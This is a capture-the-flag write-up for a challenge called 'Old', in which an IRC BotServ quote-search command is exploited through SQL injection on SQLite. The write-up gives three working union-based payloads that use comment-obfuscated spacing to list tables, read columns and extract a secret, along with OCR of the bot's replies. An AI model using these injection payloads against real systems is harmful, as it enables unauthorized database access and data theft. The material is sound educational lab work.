# Old
> When the art of quoting is being dominated, the old secrets are brought to the light.

## About the Challenge
There is a bot called `BotServ` which has many functions, such as being able to search for quotes, being able to display quotes, etc.


[Image extracted text: BotServ
BotServ allows you
to have
bot
on
your
own channel -
BotServ
It has been created for
users that can
t host
or
BotServ configure a bot,
or
for
use
on
networks that don't
BotServ
allow user bots_
Available commands
are listed
BotServ
below;
to
use
them,
type /msg BotServ
command 
For
BotServ
more information
on
a
specific command,
type
BotServ
Imsg
BotServ
HELP
command 
BotServ
HELP
Displays this list and give information about commands
BotServ
QUOTES
Random Haxor Quotes
BotServ
BotServ
Bot will join
a
channel whenever there is
at least
BotServ
1
user(s)
on
it_]


## How to Solve?
There is a search feature in the `BotServ` bot where this function is vulnerable to SQL injection on SQLite database. Here is the query I used to extract the table name, the column, and also the data

Extract table name
```
/msg BotServ QUOTES SEARCH ')/**/union/**/SELECT/**/group_concat(tbl_name)/**/FROM/**/sqlite_master/**/WHERE/**/type='table'/**/and/**/tbl_name/**/NOT/**/like/**/'sqlite_%'/**/limit/**/1/**/offset/**/1--
```


[Image extracted text: 07:14
<Test>
Hola
QUOTES SEARCH
')/**/union/**/SELECT/**/group_concat(tbl_name)/**/FROM**/sqlite_master/**/WHERE/**/type-'table' /**/and/**/tbl_name/**/NOT/**/like/**/'sqli
te_%' /**/limit/**/1/**loffset/**/1-
07:14
<Test>
BotServ
Random quotes matching your query: quotes,old_secrets,new_secrets]


Extract column name
```
/msg BotServ QUOTES SEARCH ')/**/union/**/SELECT/**/GROUP_CONCAT(name)/**/AS/**/column_names/**/FROM/**/pragma_table_info('old_secrets')/**/LIMIT/**/1/**/OFFSET/**/1--
```


[Image extracted text: 07:12
<Test>
Hola QUOTES SEARCH
3/**/union/**/SELECT/**/GROUP_CONCAT(name)/**/AS/**/column_names/**/FROW**/pragma_table_info( 'old_secrets' )/**/LIMIT/**/1/**/OFFSET/**/1--
1**/ -
07:12
<Test>
BotServ
Random quotes matching
query: id,secret
your]


Extract data
```
/msg BotServ QUOTES SEARCH ')/**/union/**/select/**/secret/**/from/**/old_secrets/**/limit/**/1/**/offset/**/5--
```

The flag was found in the `secret` column inside the `old_secrets` table


[Image extracted text: 07:10
<Test>
Hola QUOTES SEARCH
)/**/union/**/select/**/secret/**/fron/**/old_secrets/**/limit/**/1/**/offset/**/5--
07:10
<Test>
BotServ
Random quotes matching your
query:
EKO{s3cr3tzzzzz}]


```
EKO{s3cr3tzzzzz}
```